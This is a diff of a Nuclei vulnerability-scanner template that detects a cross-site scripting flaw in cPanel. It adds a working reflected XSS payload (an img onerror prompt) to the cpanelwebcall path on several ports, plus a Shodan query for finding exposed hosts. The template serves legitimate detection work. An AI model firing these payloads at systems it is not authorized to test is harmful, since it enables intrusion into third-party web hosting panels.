@@ -1,37 +1,33 @@
 id: cPanel-xss
 
 info:
-  name: cPanel-xss
+  name: cPanel - Cross-Site Scripting
   author: H1NTR0X01
   severity: medium
-  description: cPanel vulnerable to cross-site scripting.
-  reference:
-    - https://twitter.com/71ntr
-  classification:
-    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:C/C:L/I:L/A:N
-    cvss-score: 5.4
-    cwe-id: CWE-80
-  tags: cpanel,xss
+  reference: https://blog.assetnote.io/2023/04/26/xss-million-websites-cpanel/
+  metadata:
+    verified: "true"
+    shodan-query: title:"cPanel"
+  tags: cve,cve2023,cpanel,xss
 
-requests:
+http:
   - method: GET
     path:
-      - "{{BaseURL}}:2083/cpanelwebcall/aaaaaaaaaaaabrokendelta"
-      - "{{BaseURL}}:2082/cpanelwebcall/aaaaaaaaaaaabrokendelta"
-      - "{{BaseURL}}:80/cpanelwebcall/aaaaaaaaaaaabrokendelta"
-      - "{{BaseURL}}/cpanelwebcall/aaaaaaaaaaaabrokendelta"
+      - '{{BaseURL}}:2083/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">h1ntr0x01'
+      - '{{BaseURL}}:2082/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">h1ntr0x01'
+      - '{{BaseURL}}:80/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">h1ntr0x01'
+      - '{{BaseURL}}/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">h1ntr0x01'
 
     stop-at-first-match: true
     matchers-condition: and
     matchers:
       - type: word
-        words:
-          - aaaaaaaaaaaabrokendelta
-          - cPanel
-          - Webmail
         part: body
+        words:
+          - '<img src=x onerror="prompt(document.domain)">h1ntr0x01'
+          - 'Invalid webcall ID:'
+        condition: and
 
       - type: status
         status:
           - 400
-
